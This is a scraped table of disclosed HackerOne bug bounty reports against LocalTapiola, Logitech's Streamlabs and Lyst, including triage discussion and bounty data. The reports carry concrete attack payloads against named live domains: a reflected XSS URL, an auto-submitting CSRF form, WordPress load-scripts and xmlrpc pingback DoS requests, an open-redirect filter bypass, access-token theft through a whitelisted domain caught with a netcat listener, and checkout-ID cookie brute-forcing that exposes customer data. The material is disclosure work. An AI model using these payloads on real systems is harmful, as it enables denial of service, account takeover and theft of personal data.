This software is password protected, but some pages are publicly available and reveal internal information.
The welcome page is located at: http://www.lahitapiola.fi/henkilo?pagename=Support/Home
This page reveal data as the running user: DefaultReader and the internal server name: s17334.tapiola.fi
Also other information like the server context:

cs_version:'Oracle WebCenter Sites 11.1.1.6.1  Build Date: Nov 13 2013 at 19:25:33 Build Number: 66 Revision:160478'
java_runtime_version:'1.6.0_38-b05'
java_version:'1.6.0_38'
java_vm_version:'20.13-b02'
os_arch:'amd64'
os_name:'Linux'
os_version:'2.6.18-308.16.1.el5'
os_proc: 4
ws_info:'Apache Tomcat/7.0.35'

There are other available pages like:
http://www.lahitapiola.fi/henkilo?pagename=Support/Performance/Home
http://www.lahitapiola.fi/henkilo?pagename=Support/Performance/Standard/Home
These pages are also accessible through: http://www.lahitapiola.fi/cs/Satellite
For example: http://www.lahitapiola.fi/cs/Satellite?pagename=Support/Home
I have tested default Fatwire usernames and passwords, and it seems that they were changed, but anyway it is recommended to check the credentials of the users allowed to login from Internet.",https://hackerone.com/reports/164581,Espoo,Finland,Espoo,2016,8,30,23,58
LocalTapiola,1001-5000,0.0,over-1b,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Reflected XSS in www.lahitapiola.fi (/cs/Satellite) using Oracle WebCenter -page,"rpinuaga  submitted a report to LocalTapiola.Aug 30th (6 years ago)There is possible to include HTML/Javascript code in the parameter ""destpage"" of one of the Fatwire pages.
The affected Fatwire page is: OpenMarket/Xcelerate/UIFramework/LoginError
This allows to launch a reflected XSS attack by creating a simple URL like the following:
https://www.lahitapiola.fi/cs/Satellite?destpage=""><h1>xxx<script>alert(111)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
The XSS not persistent, so only users that visit the malicious URL will execute the injected Javascript.",https://hackerone.com/reports/164578,Espoo,Finland,Espoo,2016,8,30,23,47
LocalTapiola,1001-5000,0.0,over-1b,"$5,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Blind Stored XSS Against Lahitapiola Employees - Session and Information leakage,mlitchfield  submitted a report to LocalTapiola.Apr 28th (7 years ago),https://hackerone.com/reports/135154,Espoo,Finland,Espoo,2016,4,28,8,21
LocalTapiola,1001-5000,0.0,over-1b,$400.00,No value,0.0,Cross-Site Request Forgery (CSRF),Cookie-based client-side denial-of-service to all of the Lähitapiola domains,"putsi  submitted a report to LocalTapiola.Apr 7th (7 years ago)Cookie-based client-side denial-of-service to all of the Lähitapiola domains
Time of detection: 23.2.2016 03:00-04:00
Affected URL: https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi
Description:
After the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).
The vulnerability affects anonymous AND authenticated users.
This full client-side denial-of-service will last until the ""selectedArea""-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the ""selectedArea""-cookie.
List of domains which cannot be used by the client:

www.tapiola.fi
www.lahitapiola.fi
verkkopalvelu.tapiola.fi
yrityspalvelu.tapiola.fi

Steps to reproduce:

Navigate either directly or via CSRF-attack to following URL:


https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi


Try to open www.tapiola.fi and notice that a white screen is returned.
Try to open www.lahitapiola.fi and notice that a white screen is returned.
Try to open verkkopalvelu.tapiola.fi and notice that a white screen is returned.
Try to open yrityspalvelu.tapiola.fi and notice that a white screen is returned.
Delete browser cookies and notice that you can now browse the Lähitapiola-website normally.

CSRF proof-of-concept:
Code 525 BytesWrap lines Copy Download1<html>
2  <body>
3    <form action=""https://www.lahitapiola.fi/cs/Satellite"">
4      <input type=""hidden"" name=""pagename"" value=""LahiTapiola&#47;LTStatus"" />
5      <input type=""hidden"" name=""cookieName"" value=""selectedArea"" />
6      <input type=""hidden"" name=""cookieValue"" value=""1"" />
7      <input type=""hidden"" name=""backurl"" value=""http&#58;&#47;&#47;www&#46;lahitapiola&#46;fi"" />
8      <input type=""submit"" value=""Submit request"" />
9    </form>
10    <script>
11      document.forms[0].submit();
12    </script>
13  </body>
14</html>",https://hackerone.com/reports/129001,Espoo,Finland,Espoo,2016,4,7,13,21
LocalTapiola,1001-5000,0.0,over-1b,$50.00,High,7.95,Denial of Service,DoS of www.lahitapiolarahoitus.fi via CVE-2018-6389 exploitation,"exadmin  submitted a report to LocalTapiola.Apr 9th (5 years ago)Description##
There is possibility in /wp-admin/load-scripts.php script to generate large (~3Mb) amount of data via simple non-authenticated request to server.
The vulnerability is registered as https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
Details##
Detailed attack scenario is described for example here: https://baraktawily.blogspot.ru/2018/02/how-to-dos-29-of-world-wide-websites.html
I have an Apache JMeter script  which is able to simulate necessary loading for your site (can be provided to you if necessary).
Ready for call URL is following##
https://www.lahitapiolarahoitus.fi/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer
(it cab be longer, this is just an example)
As no rate-limiting is setup for this URL - then DoS comes real.
Variants to fix issue##
change default ""admin"" directory name (Security through obscurity)
or apply some password protection to /wp-admin/ url
or apply some rate-limiting (but DDoS is still possible)
Thank you!
Unfortunatelly, no fix from WordPress side is provided for this issue.
Impact
DoS of the site and application server",https://hackerone.com/reports/335177,Espoo,Finland,Espoo,2018,4,9,21,10
LocalTapiola,1001-5000,0.0,over-1b,$315.00,Medium,5.45,Denial of Service,xmlrpc.php FILE IS enable it will used for bruteforce attack and denial of service,"jack567son  submitted a report to LocalTapiola.Mar 12th (5 years ago)hy
https://www.lahitapiolarahoitus.fi is wordpress site
Wordpress  that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://www.lahitapiolarahoitus.fi has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.
In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. See screenshot 2:
POST /xmlrpc.php HTTP/1.1
Host: www.lahitapiolarahoitus.fi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
<?xml version=""1.0"" encoding=""utf-8""?> 
Code 91 BytesWrap lines Copy Download1<methodCall> 
2<methodName>system.listMethods</methodName> 
3<params></params> 
4</methodCall>
Notice that a successful response is received showing that the xmlrpc.php file is enabled.
Now, considering the domain www.lahitapiolarahoitus.fi, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.
POST /xmlrpc.php HTTP/1.1
Host: www.lahitapiolarahoitus.fi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 291
<?xml version=""1.0"" encoding=""UTF-8""?>
Code 435 BytesWrap lines Copy Download1<methodCall>
2<methodName>pingback.ping</methodName>
3<params>
4<param>
5<value><string>http://173.243.56.36/</string></value>
6</param>
7<param>
8<value><string>https://www.lahitapiolarahoitus.com/</string></value>
9</param>
10</params>
11</methodCall>
12As soon as the above request is sent, the victim host (173.243.56.36) gets an entry in its log file with a request originating from the www.lahitapiolarahoitus.fi domain verifying the pingback.
remediation:
If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.
thanks 
note: screenshots are given below
Impact
This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
this method is also used for brute force attacks to stealing the admin credentials and other important credentials3 attachments:F271753: Screenshot_(31).pngF271754: Screenshot_(32).pngF271755: Screenshot_(33).png",https://hackerone.com/reports/325040,Espoo,Finland,Espoo,2018,3,12,17,7
LocalTapiola,1001-5000,0.0,over-1b,$100.00,Low,2.0,Violation of Secure Design Principles,Error Page Content Spoofing or Text Injection (viestinta.lahitapiola.fi),"ak1t4  submitted a report to LocalTapiola.Nov 11th (6 years ago)Hi team!
I want to report a context spoofing or text injection at the new scope added [ viestinta.lahitapiola.fi ] 
Vulnerability Description: The new scope  allows users to inject any content on the 404 not found webpage
Vulnerable Location:
http://viestinta.lahitapiola.fi/!!!ATENTION!%20This%20server%20is%20on%20Maintenance%20please%20go%20to%20WWW.EVIL.COM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
Image F134122: Captura_de_pantalla_2016-11-11_a_las_13.48.26.png 51.46 KiBZoom in Zoom out Copy Download
Fix & Mitigation:
Fix 404 error page to a new who not allow text content injection
Please let me know if more info needed,
Best Regards,
@ak1t41 attachment:F134122: Captura_de_pantalla_2016-11-11_a_las_13.48.26.pngSummary by ak1t4Simple content text injection :)
thanks to localtapiola,
Regards,
@ak1t4",https://hackerone.com/reports/181594,Espoo,Finland,Espoo,2016,11,11,16,51
Logitech,5001-10000,0.0,over-1b,$100.00,Low,2.0,Insecure Direct Object Reference (IDOR),IDOR when creating App on [platform.streamlabs.com/api/v1/store/whitelist] with user_id field,"bugra  submitted a report to Logitech.Sep 16th (2 years ago)Summary:
Hi team,
There is a IDOR when applying to platform.streamlabs.com after loginning.
If you login to platform.streamlabs.com and click Create App. You will see the ""apply form"". And if you submit it, you will see the user_id parameter in JSON data of the apply request. (api/v1/store/whitelist). This parameter is vulnerable for IDOR, you can apply to platform as another accounts.
Also these user_ids are sequential, so any attacker can apply this form with a lot of accounts with random values. Attacker can force the victims' apply forms to be rejected.
## Steps To Reproduce:

Sign-up to platform.streamlabs.com with 2 different accounts (Make sure you didn't apply the apply form before.)
Click Create App and turn on the proxy
Fill in the form and click  Apply
Change the user_id on the JSON data of the request to your another account's ID.
Forward the request.

user_id's are sequential, for finding your user_id you can go to https://platform.streamlabs.com/api/v1/s/user/me
If you see 200 OK in response, that means you submitted the form as victim.
Image F989441: 200.PNG 90.54 KiBZoom in Zoom out Copy Download
Now, the victim can't apply the form again. And if you fill the form with random values. Streamlabs will probably reject the victim's form because of random values.
Impact
Any attacker can apply the platform form with a lot of accounts with random values. So attacker can force the victims' apply forms to be rejected.
I don't know the full impact because I didn't get response for my Platform request yet. Maybe there is more serious impact on this issue but I can't figure it out for now.
Thanks,
Bugra1 attachment:F989441: 200.PNGlogi_aron Logitech staff  changed the report title from IDOR when Applying to Streamlabs Platform  to IDOR when creating App on [platform.streamlabs.com/api/v1/store/whitelist]. Sep 16th (2 years ago)logi_aron Logitech staff  changed the report title from IDOR when creating App on [platform.streamlabs.com/api/v1/store/whitelist] to IDOR when creating App on [platform.streamlabs.com/api/v1/store/whitelist] with user_id field. Sep 16th (2 years ago)logi_aron Logitech staff  updated the severity from medium (5.0) to low. Sep 16th (2 years ago)0xcain   posted a comment. Sep 16th (2 years ago)Hi @bugra,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@0xcain0xcain   changed the status to Triaged. Sep 16th (2 years ago)Hello @bugra,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Regards,
@0xcainLogitech  rewarded bugra with a $100 bounty. Sep 16th (2 years ago)
    
    
        
            
                
                
                
            
        
    
bugra   posted a comment. Sep 16th (2 years ago)Thanks!logi_salman Logitech staff  closed the report and changed the status to Resolved. Sep 16th (2 years ago)@bugra Thanks for reporting the issue. Team has deployed a fix. Please let us know if you can still reproduce it.bugra   requested to disclose this report. Nov 26th (2 years ago)logi_harsha Logitech staff  agreed to disclose this report. Nov 26th (2 years ago)  This report has been disclosed. Nov 26th (2 years ago)",https://hackerone.com/reports/983070,Vaud,Switzerland,Lausanne,2020,9,16,0,34
Logitech,5001-10000,0.0,over-1b,$100.00,Low,2.0,Open Redirect,GET based Open redirect on [streamlabs.com/content-hub/streamlabs-obs/search?query=],"raywando  submitted a report to Logitech.Sep 10th (2 years ago)Summary:
Description: in the following link, the parameter query is reflecting in multiple places, one of them is in the <meta> tag in the head section of the HTML source, the reflection is in the content attribute to be precise (check the below image)
Image F983200: BurpSuitePro_fbYxtoK5TV.png 52.67 KiBZoom in Zoom out Copy Download
And i was able to break out of the content attribute and was able to bypass the Cloudflare protection that wouldnt let me to add http-equiv attribute by using %00 char to finally achieve the following redirect using a crafted payload
Image F983205: BurpSuitePro_K0xRt92DW2.png 60.27 KiBZoom in Zoom out Copy Download
PoC: https://streamlabs.com/content-hub/streamlabs-obs/search?query=0;url=https://google.com""%20http-%00equiv=""refresh""
Payload: 0;url=https://google.com/document.cookie""%20http-%00equiv=""refresh""
Readable payload: 0;url=https://google.com/"" http-equiv=""refresh""
Impact
Open redirect2 attachments:F983200: BurpSuitePro_fbYxtoK5TV.pngF983205: BurpSuitePro_K0xRt92DW2.pnglogi_aron Logitech staff  changed the status to Triaged. Sep 10th (2 years ago)logi_aron Logitech staff  updated the severity from high to low. Sep 10th (2 years ago)Logitech  rewarded raywando with a $100 bounty. Sep 10th (2 years ago)Hi @raywando - Thank you for the report. As this is just an open redirect, and you don't appear to be able to leverage this into a XSS, setting a Low and awarding as such. Keep up the great work.logi_aron Logitech staff  changed the report title from GET based Open redirect to GET based Open redirect on [streamlabs.com/content-hub/streamlabs-obs/search?query=]. Sep 10th (2 years ago)raywando   posted a comment. Sep 10th (2 years ago)Hi @logi_aron,
Thanks for the incredible fast answer! I apologize for marking the report as high, i was trying to scalate the issue and I forgot to lower the severity.
But isn't low bugs start from 250?
@raywando logi_aron Logitech staff  posted a comment. Sep 10th (2 years ago)Hi @raywando For this asset Low is currently $100raywando   posted a comment. Sep 10th (2 years ago)Ah, alright, thanks for the bounty! <3logi_harsha Logitech staff  closed the report and changed the status to Resolved. Sep 10th (2 years ago)hi @raywando
this issue has been fixed now, please let us know if you are still able to reproduce this.
thanks for the reportraywando   posted a comment. Sep 11th (2 years ago)Hi @logi_smaddela,
Yes, it is fixed, thank you for the fast response!
@raywando raywando   posted a comment. Sep 11th (2 years ago)Hi, @logi_smaddela ,
Can we disclose the report?logi_harsha Logitech staff  posted a comment. Sep 11th (2 years ago)hi @raywando you can disclose it wherever you'd like.raywando   requested to disclose this report. Oct 9th (2 years ago)let's disclose it.logi_harsha Logitech staff  agreed to disclose this report. Oct 9th (2 years ago)  This report has been disclosed. Oct 9th (2 years ago)raywando   posted a comment. Oct 11th (2 years ago)Hi,
Can i reach you on the company's security email?
I have an important security-related question i need to ask directly.
Thankslogi_aron Logitech staff  posted a comment. Oct 12th (2 years ago)@raywando All contact with us is done via HackerOne. If you believe you have found an issue please file a new report. We don’t communicate via email.",https://hackerone.com/reports/978680,Vaud,Switzerland,Lausanne,2020,9,10,21,28
Logitech,5001-10000,0.0,over-1b,$100.00,Low,2.4,Privilege Escalation,Privilege Escalation Leads to Control The Owner Access Token Which leads to control the stream [streamlabs.com],"mrmax4o4  submitted a report to Logitech.Apr 26th (2 years ago)Hi Security team,
Summary:
 I was able as Administrator  to change the account owner access token 
Description:
As Administrator i have high privileges but i have some restricted areas
Image F1278364: Logitech-Admin-priv.png 126.70 KiBZoom in Zoom out Copy Download
For example i got invitation from MrX with Administrator role.
When i navigated to MrX account as administrator i found all the menu items except the settings
Image F1278370: Logitech-PS2.png 89.14 KiBZoom in Zoom out Copy Download
so i tried to navigate to dashboard/#settings and i was able to access MrX's account settings!
Image F1278399: Logitech-P6.png 122.43 KiBZoom in Zoom out Copy Download
I tried to use many features but couldn't but found on API Settings --> API Tokens some cool feature allowed me  to Refresh API Access Token which is part of a lot of requests (will describe on the impact section)
Steps to reproduce:
we need 2 accounts 

MrX (account owner)
MrMax


Using MrX account go to https://streamlabs.com/dashboard#/settings/shared-access and create invitation with administration role, Copy the link
Open the link on your other browser which you are logged in as MrMax, accept the invite then click on MrXto access his account
Image F1278374: Logitech-PS1.png 99.81 KiBZoom in Zoom out Copy Download
You will get message on the top says You are currently acting as MrX, click here to return to MrMax. , now navigate to
https://streamlabs.com/dashboard#/settings/api-settings you well see empty Access token field , click on Refresh then yes
Image F1278380: Logitech-P3.png 116.70 KiBZoom in Zoom out Copy Download

Done ^ ^
Impact
The API Access Token is used in most of API requests and a lot of other places e.g.
Image F1278381: Logitech-P4.png 164.49 KiBZoom in Zoom out Copy Download
Here is a list of URLs the token used on , This list represents about 80% of the uses for this token here is one of the uses for this token:
To stream

I must install recording software supports streaming (e.g. OBS Studio..etc.)
To use any of the streamlabs widgets (Alert box , Start goal , The jar ,Tip ticker , Follower goal , View count , Stream boss , Sponsor banner...etc. ) i must have link contains this token 

Image F1278389: Logitech-P5.png 301.28 KiBZoom in Zoom out Copy Download
I want to use this widget i should take this url and paste it on the streaming software to make it visible to the  stream viewers
So as a bad administrator i can change the API Access Token  while MrX is streaming which will stop the above widgets which  revokes the main reason for making the streamlabs application which is widgets to help the streamers.
I am still investigating for more impacts and i will let you know if there is any updates
Best Wishes,
MrMax8 attachments:F1278362: Logitech-PS-2.mp4F1278364: Logitech-Admin-priv.pngF1278370: Logitech-PS2.pngF1278374: Logitech-PS1.pngF1278380: Logitech-P3.pngF1278381: Logitech-P4.pngF1278389: Logitech-P5.pngF1278399: Logitech-P6.pngh1_analyst_oceana HackerOne triage  posted a comment. Apr 27th (2 years ago)Hi @mrmax4o4,
Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Have a great day! 
Kind regards,
@magicmouselogi_harsha Logitech staff  closed the report and changed the status to Not Applicable. Apr 27th (2 years ago)hi @mrmax4o4 Admin privileges give full access to the account excluding shared access setting and donation/payment method settings. API Access token from API Settings page is available to admins through widgets already. We will re-open this if you are able to modify donation settings/shared access settings as an Admin.
Thanks for the report.
    
    
        
            
                
                
                
            
        
    
mrmax4o4   posted a comment. Updated Apr 27th (2 years ago)Hi @logi_harsha ,
Thanks for your quick response my point here not it's available to the admins my point is the admin can refresh the access token which is not available through the widgets !
although admin has wide permissions on the account but he don't have the account setting tab on the main menu which means he don't have access to it.
what proves my point is when i navigate to the settings tab as administrator i see everything blank even the access token field and i can't change or even register an app just i can refresh the token which i think you missed it.
In another meaning the admin can see the access token on all widgets yes but the ability to change it could lead to some problem as i explained on the impact section
Thanks,
    
    
        
            
                
                
                
            
        
    
mrmax4o4   posted a comment. Updated Apr 27th (2 years ago)Just look at this video i don't have access to any single feature on the settings page just the refresh option.
This refresh feature not available anywhere else just the account settings
Thanks,1 attachment:F1279739: Logitech-Priv-Poc-2.mp4logi_harsha Logitech staff  posted a comment. Apr 27th (2 years ago)I will discuss about this particular use case with the team and let you know soon.
Thankslogi_harsha Logitech staff  reopened this report. Apr 27th (2 years ago)logi_aron Logitech staff  updated the severity from high to low (2.4). Apr 27th (2 years ago)logi_aron Logitech staff  changed the status to Triaged. Apr 27th (2 years ago)
    
    
        
            
                
                
                
            
        
    
mrmax4o4   posted a comment. Updated Apr 27th (2 years ago)Hi @logi_aron , Thanks for the triaged !
But don't you think it's higher than low ?  according to the above Impact scenario.
I will be grateful if you can check the scenario and the final impact and reassessment of severity.
Thanks,Logitech  rewarded mrmax4o4 with a $100 bounty. Apr 27th (2 years ago)The severity level is correct as Low. An Administrator user is already a significant trusted permission to be granted to an ""Attacker"". The fact that this Attacker could invalidate the token doesn't imperil the Owner account and leads to a minor annoyance to the Owner rather than a security issue itself.logi_aron Logitech staff  closed the report and changed the status to Resolved. Apr 27th (2 years ago)This has now been fixed.
    
    
        
            
                
                
                
            
        
    
mrmax4o4   requested to disclose this report. Apr 27th (2 years ago)The fix works properly.
Thanks,logi_harsha Logitech staff  agreed to disclose this report. Apr 27th (2 years ago)  This report has been disclosed. Apr 27th (2 years ago)",https://hackerone.com/reports/1174527,Vaud,Switzerland,Lausanne,2021,4,26,3,15
Logitech,5001-10000,0.0,over-1b,$100.00,Medium,5.4,None,Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r=,"sudi  submitted a report to Logitech.Sep 2nd (about 1 year ago)Heyy there,
After  reading the disclosed report #1178239, I started to look for bypasses but I found that it's restricted to only streamlabs.com and merch.streamlabs.com , providing any other domain or subdomain of streamlabs.com gives an error instead of the 302 redirect.
From wayback machine (https://web.archive.org/), I found a bunch of domains which were  used in the redirect parameter r.
Code 728 BytesWrap lines Copy Download1https://streamlabs.com/global/identity?r=https://darthvapes.tv
2https://streamlabs.com/global/identity?r=https://dragynslair.live/
3https://streamlabs.com/global/identity?r=https://franmg.net/merch
4https://streamlabs.com/global/identity?r=https://itzyony2.com
5https://streamlabs.com/global/identity?r=https://lmgtwitch.com
6https://streamlabs.com/global/identity?r=https://maitresharinganv1.com
7https://streamlabs.com/global/identity?r=https://themavshow.tv
8https://streamlabs.com/global/identity?r=https://veterangamertv.com
9https://streamlabs.com/global/identity?r=https://www.koopatroop.com
10https://streamlabs.com/global/identity?r=https://www.lokenplays.com
11https://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com
Visiting all these urls in my browser I found that only these 3 domains were allowed (the access_token was sent to this domains)
dragynslair.live
darthvapes.tv
nixxiom.tv
If an authenticated user visits this url, his access_token will be sent to the dragynslair.live domain:
https://streamlabs.com/global/identity?r=https://dragynslair.live/
Image F1433713: BurpSuiteCommunity_SxHPNdXsnP.png 50.13 KiBZoom in Zoom out Copy Download
In this screenshot you can see that the access_token is added as a query parameter.
The most interesting thing about this particular domain is that it is available for registration, which you can verify from here:
https://www.name.com/domain/search/dragynslair.live
Anyone can buy this domain name for $3 , which will allow him to takeover any streamlab's user account
Image F1433718: firefox_ZayRHz2tWl.png 39.95 KiBZoom in Zoom out Copy Download

Steps to reproduce:
As I haven't actually purchased this domain name dragynslair.live , to prove that I can steal the access_token. I will add dragynslair.live to my /etc/hosts file which will point to 127.0.0.1 and a web server wil be running on port 80 locally.
This should be enough to validate this finding.
1.Open your /etc/hosts file and add this line to it , save it
Code 27 BytesWrap lines Copy Download1127.0.0.1  dragynslair.live
2.Now start a web server on port 80 by using this command  sudo nc -lvk 80
3.Open this url https://streamlabs.com/global/identity?popup=1&r=http://dragynslair.live (make sure the user is authenticated)
4.Check the ncat command output you should see the access_token parameter 
Image F1433725: ubuntu_dSh04rREny.png 29.27 KiBZoom in Zoom out Copy Download
This access_token then can be used in the following api endpoints: https://dev.streamlabs.com/reference

Impact
By just sending the url an attacker can steal victim's access_token which can be used in the streamlabs api endpoints.
Thankyou
Regards
Sudhanshu3 attachments:F1433713: BurpSuiteCommunity_SxHPNdXsnP.pngF1433718: firefox_ZayRHz2tWl.pngF1433725: ubuntu_dSh04rREny.pngh1_analyst_layla HackerOne triage  changed the status to Triaged. Sep 5th (about 1 year ago)Hello @sudi,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Thanks,
@bassguitarh1_analyst_layla HackerOne triage  updated the severity from critical to medium (5.4). Sep 5th (about 1 year ago)
    
    
        
            
                
                
                
            
        
    
sudi   posted a comment. Sep 5th (about 1 year ago)Hey  @bassguitar , Attack confidentiality is set to High because I demonstrated the poc without actually buying the domain?
https://dev.streamlabs.com/reference#token-1
Image F1437337: Screenshot_2021-09-05-16-35-50-61_40deb401b9ffe8e1df2f1cc5ba480b12.jpg 241.85 KiBZoom in Zoom out Copy Download
Access token allows you to access a users' Streamlabs data.
Even though I am able to steal other users access_token by just sending them a url, the severity for this bug is medium?
In report #1178239, in order to steal the access_token the malicious app must be installed on the victim's  mobile.
In my report there is no such limitation, I am able to take control over the whole redirect uri not just the protocol part.
Let me know if any more info is required.
Regards
Sudhanshu1 attachment:F1437337: Screenshot_2021-09-05-16-35-50-61_40deb401b9ffe8e1df2f1cc5ba480b12.jpgsudi   invited another hacker as a collaborator. Sep 7th (about 1 year ago)logi_salman Logitech staff  closed the report and changed the status to Resolved. Sep 7th (about 1 year ago)@sudi Thank you for the report. Team has deployed a fix for this. Can you please validate?
    
    
        
            
                
                
                
            
        
    
sudi   posted a comment. Sep 8th (about 1 year ago)Yeah I can confirm the fix @logi_salman .
Just to make sure the same bug doesn't appear again ,you can also remove these domains from the whitelist:
Code 78 BytesWrap lines Copy Download1darthvapes.tv
2lmgtwitch.com
3koopatroop.com
4koopatroop.com
5yagurlbubblezl4d.com
As if any of the above domain gets available for registration, the same bug will appear again.
And also can you reconsider the severity for this issue, I already mentioned my explanation in the previous comment regarding the severity of this issue?
Regards
Sudhanshuhackforgood   joined this report as a collaborator. Sep 9th (about 1 year ago)
    
    
        
            
                
                
                
            
        
    
sudi   posted a comment. Sep 10th (about 1 year ago)@logi_salman , any update regarding the bounty?Logitech  rewarded hackforgood with a $100 bounty. Sep 10th (about 1 year ago)Logitech  rewarded sudi with a $100 bounty. Sep 10th (about 1 year ago)
    
    
        
            
                
                
                
            
        
    
sudi   requested to disclose this report. Sep 10th (about 1 year ago)Can we disclose this?
    
    
        
            
                
                
                
            
        
    
sudi   posted a comment. Sep 15th (about 1 year ago)hey @logi_salman , can we disclose this please?logi_salman Logitech staff  posted a comment. Sep 15th (about 1 year ago)@sudi We will accept disclosure request once we are satisfied with our fix. We will be reviewing the change soon and will update you.Thank you for your time and effort.
    
    
        
            
                
                
                
            
        
    
sudi   posted a comment. Nov 4th (about 1 year ago)Hey @logi_salman , it's been 2months now are you satisfied with your fix now?
If yes, can we disclose this.
Regards
Sudhanshulogi_salman Logitech staff  agreed to disclose this report. Nov 4th (about 1 year ago)  This report has been disclosed. Nov 4th (about 1 year ago)",https://hackerone.com/reports/1327742,Vaud,Switzerland,Lausanne,2021,9,2,4,53
Logitech,5001-10000,0.0,over-1b,$200.00,Medium,4.7,Open Redirect,session takeover via open protocol redirection on streamlabs.com,"f_m  submitted a report to Logitech.Apr 28th (2 years ago)Summary:
Hi Logitech team, on streamlabs.com the endpoint: streamlabs.com/global/identity?popup=1&r=protocol://merch.streamlabs.com redirect any authenticated user to a arbitrary protocol, and it merge the redirect link with an access_token.
Image F1281409: redir.png 155.20 KiBZoom in Zoom out Copy Download
this means that if a malicious app that handle the protocol is installed on the device the access token will be steal by this app and consequently a session takeover is possible on multiple streamlabs domain 
Steps To Reproduce:

once authenticated on streamlabs.com go to: streamlabs.com/global/identity?popup=1&r=test://merch.streamlabs.com and intercept the request in burp.
grab the redirection link in the response(as a malicious app can do, especially on mobile systems), change the protocol to https and open it in a private browser window
finally in the private browser window go to: https://merch.streamlabs.com/ or https://streamlabs.com/<your_store_name> or https://streamlabs.com/my-portal?origin=cs

in every case you will be logged in as the victim
Image F1281408: 1.png 324.20 KiBZoom in Zoom out Copy Download
Image F1281407: 2.png 52.90 KiBZoom in Zoom out Copy Download
possible fix
implement a protocol check on the redirection in this endpoint
Supporting Material/References:
i attached 3 images
Impact
session takeover by  malicious apps(on mobile systems, it's more common)3 attachments:F1281407: 2.pngF1281408: 1.pngF1281409: redir.png",https://hackerone.com/reports/1178239,Vaud,Switzerland,Lausanne,2021,4,28,10,17
Lyst,101-250,0.0,50m-100m,$100.00,Low,2.0,Information Disclosure,Bypassing one-time checkout router page (revealing payment information),"tolo7010  submitted a report to Lyst.Sep 23rd (5 years ago)Description:
When user submits for a checkout, the checkout router page /checkout-router/[ID]/ is accessible only once, which can be bypassed by crafting the checkout [ID] in cookie basket_key send to the page /new/checkout/order/. combining with brute-force attack, if the ID is valid a result page shown from any user that made the payment. this disclosure contains items ordered, prices, customer name, billing address, email address, phone number... This attack require no authentications, and no rate-limit in brute-forcing checkout [ID]
Step to reproduce:

Go to https://www.lyst.com/cart/
Assuming your shopping bag is not empty, click ""checkout securely"" or https://www.lyst.com/cart/verify/set-password/
Confirming account by entering email & password.
Upon click ""checkout"", use burp to intercept the request.

You will get a redirection link to the checkout router, the form of the url is:
https://checkout.lyst.com/checkout-router/[ID]/
where [ID] is the 19 digit number identification - the link redirects again to https://checkout.lyst.com/new/checkout/order/ which you will provide billing information.
Now the point is the link https://checkout.lyst.com/checkout-router/[ID]/ is accessible only once, you will get ""This page doesn't exist"" message if you try to request the link. To bypass this, we can craft cookie value key basket_key=[ID] in request to the endpoint /new/checkout/order/.
In this report I use base key 7092456849791607456 which I created from my own check out (filled with billing address).
I use chrome extension EditThisCookie in the attached image, here are the same result from burp (also image attached):
GET /new/checkout/order/ HTTP/1.1
Host: checkout.lyst.com
User-Agent:
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: basket_key=7092456849791607456
Connection: close
Upgrade-Insecure-Requests: 1
Images Attached:
1.jpg: access the regular endpoint second time resulting in error
2.jpg: bypassing via cookie injection in another endpoint
